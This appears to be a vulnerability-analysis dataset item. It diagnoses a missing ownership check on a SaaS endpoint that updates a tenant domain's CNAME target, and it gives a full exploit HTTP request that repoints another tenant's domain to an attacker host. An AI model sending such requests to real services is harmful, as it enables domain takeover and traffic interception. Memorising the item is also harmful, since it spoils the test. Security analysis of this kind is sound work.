diagnosis: The endpoint retrieves a TenantDomain mapping by domain_id and updates its DNS routing target without verifying that the domain belongs to the current tenant or that request.user has domain management privileges, allowing domain takeover.
exploit_request:
POST /api/tenants/domains/update-cname/ HTTP/1.1
Host: saas.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/x-www-form-urlencoded

domain_id=208&cname_target=traffic.attacker.com
